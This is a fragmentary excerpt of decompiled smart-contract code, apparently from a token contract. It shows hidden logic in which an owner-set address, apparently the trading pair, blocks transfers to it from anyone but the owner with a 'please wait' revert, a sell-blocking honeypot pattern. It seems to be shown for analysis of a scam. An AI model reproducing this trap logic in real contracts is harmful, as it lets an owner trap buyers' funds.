...
function sub_5f7edb9a(?) payable {
    return sub_5f7edb9aAddress
}
...
function transferNew(address arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_5f7edb9aAddress = arg1
}
...
function transfer(address arg1, uint256 arg2) payable {
    ...
    if sub_5f7edb9aAddress:
        if arg1 == sub_5f7edb9aAddress:
            if owner != msg.sender:
...
function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    ...
    if not arg1:
        if arg2 == sub_5f7edb9aAddress:
            if arg1 != owner:
                revert with 0, 'please wait'
    else:
        if not sub_5f7edb9aAddress:
            sub_5f7edb9aAddress = arg2
        else:
            if arg2 == sub_5f7edb9aAddress:
                if arg1 != owner:
                    revert with 0, 'please wait'
